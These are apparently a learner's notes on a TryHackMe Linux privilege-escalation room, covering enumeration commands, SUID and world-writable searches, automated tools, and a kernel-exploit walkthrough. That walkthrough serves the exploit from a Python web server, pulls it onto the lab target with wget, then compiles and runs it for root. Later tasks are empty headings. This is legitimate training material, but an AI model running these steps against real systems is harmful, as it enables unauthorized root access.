Privilege Escalation
Learn the fundamental techniques that will allow you to elevate account privileges in Linux and windows systems.

• https://tryhackme.com/room/introtoshells

• https://tryhackme.com/room/linprivesc

• [https://tryhackme.com/room/linprivesc](https://tryhackme.com/room/windowsprivesc20)


## ② The fundamentals of Linux privilege escalation. From enumeration to exploitation, get hands-on with over 8 different privilege escalation techniques.

# Task 1 Introduction
Privilege escalation is a journey. There are no silver bullets, and much depends on the specific configuration of the target system. The kernel version, installed applications, supported programming languages, other users' passwords are a few key elements that will affect your road to the root shell.
This room was designed to cover the main privilege escalation vectors and give you a better understanding of the process. This new skill will be an essential part of your arsenal whether you are participating in CTFs, taking certification exams, or working as a penetration tester.
Answer the questions below
Read the above. `No answer needed`

# Task 2 What is Privilege Escalation?
## What does "privilege escalation" mean?
At it's core, Privilege Escalation usually involves going from a lower permission account to a higher permission one. More technically, it's the exploitation of a vulnerability, design flaw, or configuration oversight in an operating system or application to gain unauthorized access to resources that are usually restricted from the users.

## Why is it important?
It's rare when performing a real-world penetration test to be able to gain a foothold (initial access) that gives you direct administrative access. Privilege escalation is crucial because it lets you gain system administrator levels of access, which allows you to perform actions such as:

   • Resetting passwords
   • Bypassing access controls to compromise protected data
   • Editing software configurations
   • Enabling persistence
   • Changing the privilege of existing (or new) users
   • Execute any administrative command

## Answer the questions below. Read the above.`No answer needed`

# Task 3 Enumeration
Note: Launch the target machine attached to this task to follow along.You can launch the target machine and access it directly from your browser. Alternatively, you can access it over SSH with the low-privilege user credentials below:

`Username: karen
Password: Password1`
Enumeration is the first step you have to take once you gain access to any system. You may have accessed the system by exploiting a critical vulnerability that resulted in root-level access or just found a way to send commands using a low privileged account. Penetration testing engagements, unlike CTF machines, don't end once you gain access to a specific system or user privilege level. As you will see, enumeration is as important during the post-compromise phase as it is before.

## hostname
The `hostname` command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).

## uname -a
Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.

## /proc/version
The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.Looking at `/proc/version` may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed. 

## /etc/issue
Systems can also be identified by looking at the `/etc/issue` file. This file usually contains some information about the operating system but can easily be customized or changed. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.

## ps Command
The ps command is an effective way to see the running processes on a Linux system. Typing ps on your terminal will show processes for the current shell.
The output of the ps (Process Status) will show the following;

  • `PID`: The process ID (unique to the process)
  
  • `TTY`: Terminal type used by the user
  
  • `Time`: Amount of CPU time used by the process (this is NOT the time this process has been running for)
  
  • `CMD`: The command or executable running (will NOT display any command line parameter)

The “ps” command provides a few useful options.

  • `ps -A`: View all running processes
  
  • `ps axjf`: View process tree (see the tree formation until ps axjf is run below)
  
  • `ps aux`: The `aux` option will show processes for all users (a), display the user that launched the process (u), and show processes that are not attached to a terminal (x). Looking at the ps aux command output, we can have a better understanding of the system and potential vulnerabilities.

## env
The `env` command will show environmental variables.The PATH variable may have a compiler or a scripting language (e.g. Python) that could be used to run code on the target system or leveraged for privilege escalation.

## sudo -l
The target system may be configured to allow users to run some (or all) commands with root privileges. The `sudo -l` command can be used to list all commands your user can run using `sudo`.

## ls
One of the common commands used in Linux is probably `ls`. While looking for potential privilege escalation vectors, please remember to always use the `ls` command with the `-la` parameter. The example below shows how the “secret.txt” file can easily be missed using the `ls` or `ls -l` commands.

## Id
The `id` command will provide a general overview of the user’s privilege level and group memberships.It is worth remembering that the `id` command can also be used to obtain the same information for another user as seen below.

## /etc/passwd
Reading the `/etc/passwd` file can be an easy way to discover users on the system.While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks. While the output can be long and a bit intimidating, it can easily be cut and converted to a useful list for brute-force attacks. Remember that this will return all users, some of which are system or service users that would not be very useful. Another approach could be to grep for “home” as real users will most likely have their folders under the “home” directory. 

## history
Looking at earlier commands with the history command can give us some idea about the target system and, albeit rarely, have stored information such as passwords or usernames.

## ifconfig
The target system may be a pivoting point to another network. The `ifconfig` command will give us information about the network interfaces of the system. The example below shows the target system has three interfaces (eth0, tun0, and tun1). Our attacking machine can reach the eth0 interface but can not directly access the two other networks. This can be confirmed using the `ip route` command to see which network routes exist. 

## netstat
Following an initial check for existing interfaces and network routes, it is worth looking into existing communications. The `netstat` command can be used with several different options to gather information on existing connections.

   • `netstat -a`: shows all listening ports and established connections.
   
   • `netstat -at` or `netstat -au` can also be used to list TCP or UDP protocols respectively.
   
   • `netstat -l`: list ports in “listening” mode. These ports are open and ready to accept incoming connections. This can be used with the “t” option to list only ports 
that are listening using the TCP protocol (below) 

   • `netstat -s`: list network usage statistics by protocol (below) This can also be used with the `-t` or `-u` options to limit the output to a specific protocol. 
   
   • `netstat -tp`: list connections with the service name and PID information.

This can also be used with the `-l` option to list listening ports (below). We can see the “PID/Program name” column is empty as this process is owned by another user.
Below is the same command run with root privileges and reveals this information as 2641/nc (netcat).
    
   • `netstat -i`: Shows interface statistics. We see below that “eth0” and “tun0” are more active than “tun1”.

 The `netstat` usage you will probably see most often in blog posts, write-ups, and courses is `netstat -ano` which could be broken down as follows;

   • `-a`: Display all sockets
   
   • `-n`: Do not resolve names
   
   • `-o`: Display timers

##  find Command
Searching the target system for important information and potential privilege escalation vectors can be fruitful. The built-in “find” command is useful and worth keeping in your arsenal.
Below are some useful examples for the “find” command.
Find files:

   • `find . -name flag1.txt`: find the file named “flag1.txt” in the current directory
   
   • `find /home -name flag1.txt`: find the file names “flag1.txt” in the /home directory
   
   • `find / -type d -name config`: find the directory named config under “/”
   
   • `find / -type f -perm 0777`: find files with the 777 permissions (files readable, writable, and executable by all users)
   
   • `find / -perm a=x`: find executable files
   
   • `find /home -user frank`: find all files for user “frank” under “/home”
   
   • `find / -mtime 10`: find files that were modified in the last 10 days
   
   • `find / -atime 10`: find files that were accessed in the last 10 days
   
   • `find / -cmin -60`: find files changed within the last hour (60 minutes)
   
   • `find / -amin -60`: find files accesses within the last hour (60 minutes)
   
   • `find / -size 50M`: find files with a 50 MB size

This command can also be used with (+) and (-) signs to specify a file that is larger or smaller than the given size. 
Folders and files that can be written to or executed from:

   • `find / -writable -type d 2>/dev/null` : Find world-writeable folders
   
   • `find / -perm -222 -type d 2>/dev/null`: Find world-writeable folders
   
   • `find / -perm -o w -type d 2>/dev/null`: Find world-writeable folders

The reason we see three different “find” commands that could potentially lead to the same result can be seen in the manual document. As you can see below, the perm parameter affects the way “find” works. 

   • `find / -perm -o x -type d 2>/dev/null`: Find world-executable folders

Find development tools and supported languages:

   • `find / -name perl*`
   
   • `find / -name python*`
   
   • `find / -name gcc*`

Find specific file permissions: 
Below is a short example used to find files that have the SUID bit set. The SUID bit allows the file to run with the privilege level of the account that owns it, rather than the account which runs it. This allows for an interesting privilege escalation path,we will see in more details on task 6. The example below is given to complete the subject on the “find” command.

    `find / -perm -u=s -type f 2>/dev/null`: Find files with the SUID bit, which allows us to run the file with a higher privilege level than the current user. 

General Linux Commands
As we are in the Linux realm, familiarity with Linux commands, in general, will be very useful. Please spend some time getting comfortable with commands such as `find`, `locate`, `grep`, `cut`, `sort`, etc.

## Answer the questions below
# What is the hostname of the target system?  `wade7363`
```
root@ip-10-10-143-69:~# ssh karen@10.10.158.74
The authenticity of host '10.10.158.74 (10.10.158.74)' can't be established.
ECDSA key fingerprint is SHA256:2Jwy90uXhJ7tauI06IwaC9BDSjK9/HsuVGpB1CDYFvw.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.158.74' (ECDSA) to the list of known hosts.
karen@10.10.158.74's password: 
Welcome to Ubuntu 14.04 LTS (GNU/Linux 3.13.0-24-generic x86_64)
$ hostname
wade7363
$ uname -a
Linux wade7363 3.13.0-24-generic #46-Ubuntu SMP Thu Apr 10 19:11:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
```
# What is the Linux kernel version of the target system? `3.13.0-24-generic`

# What Linux is this? We can use the `cat /etc/issue` command to find the operating system version.`Ubuntu 14.04 LTS`

# What version of the Python language is installed on the system? Run the `python --version` command to see which version is installed. `2.7.6`
```
$ python
Python 2.7.6 (default, Mar 22 2014, 22:59:56) 
```
# What vulnerability seem to affect the kernel of the target system? (Enter a CVE number), did some external reseach `CVE-2015-1328`

# Task 4 Automated Enumeration Tools
Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.
The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.

   • LinPeas: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS
   
   • LES (Linux Exploit Suggester): https://github.com/mzet-/linux-exploit-suggester
   
   • Linux Smart Enumeration: https://github.com/diego-treitos/linux-smart-enumeration
   
   • Linux Priv Checker: https://github.com/linted/linuxprivchecker

# Answer the questions below
Install and try a few automated enumeration tools on your local Linux distribution. `No answer needed`

# Task 5 Privilege Escalation:Kernel Exploits
Privilege escalation ideally leads to root privileges. This can sometimes be achieved simply by exploiting an existing vulnerability, or in some cases by accessing another user account that has more privileges, information, or access.
Unless a single vulnerability leads to a root shell, the privilege escalation process will rely on misconfigurations and lax permissions.
The kernel on Linux systems manages the communication between components such as the memory on the system and applications. This critical function requires the kernel to have specific privileges; thus, a successful exploit will potentially lead to root privileges.
The Kernel exploit methodology is simple;

   1. Identify the kernel version
   2. Search and find an exploit code for the kernel version of the target system
   3. Run the exploit 

Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.

## Research sources:

   1. Based on your findings, you can use Google to search for an existing exploit code.
   2. Sources such as https://www.linuxkernelcves.com/cves can also be useful.
   3. Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).

## Hints/Notes:

   1. Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
   2. Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
   3. Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
   4. You can transfer the exploit code from your machine to the target system using the `SimpleHTTPServer` Python module and `wget` respectively.

# Answer the questions below
find and use the appropriate kernel exploit to gain root privileges on the target system.`No answer needed`

  1. Identify the kernel version.
  2. Search and find an exploit code for the kernel version of the target system.
This we can find with some quick Googling. Download the exploit and move it into your `/tmp` folder.We can also get it via `searchploit`.
  3. 3. Run the exploit.Open up the terminal on your local machine, and start up the machine in Attackbox. In Attackbox, let's run the id command and take note of our current user privilege.On your local machine, we need to start up a python server so that we can send our downloaded exploit to our target machine in Attackbox. We can do this via the `python3 -m http.server 8000` command. Don't close this terminal.Open up a new tab/terminal so that we can get the IP address of our local machine. We need this to connect to our target machine. Use the `ifconfig` command and scroll down.
Cool, now we can go ahead and send our exploit that we downloaded and stored in our /tmp file to our target machine. Go to your Attackbox and first cd into your /tmp folder before connecting to your local machine. If you don't cd into /tmp first then you will get an error when trying to connect. Now, to send the exploit and make a connection we can enter the following command (replace the IP with your ifconfig IP) `wget http://yourip:8000/37292.c`.Okay, the exploit is sent. Now to convert it, we can enter the following command `gcc 37292.c -o pwned`. With our exploit converted, we can run it via the `./pwned` command.

# What is the content of the flag1.txt file? 



# Task 6 Privilege Escalation: Sudo

# Task 7 Privilege Escalation: SUID

# Task 8 Privilege Escalation: Capabilities

# Task 9 Privilege Escalation: Cron Jobs

# Task 10 Privilege Escation: PATH

# Task 11 Privilege Escalations: NFS

# Task 12 Capstone Challenge
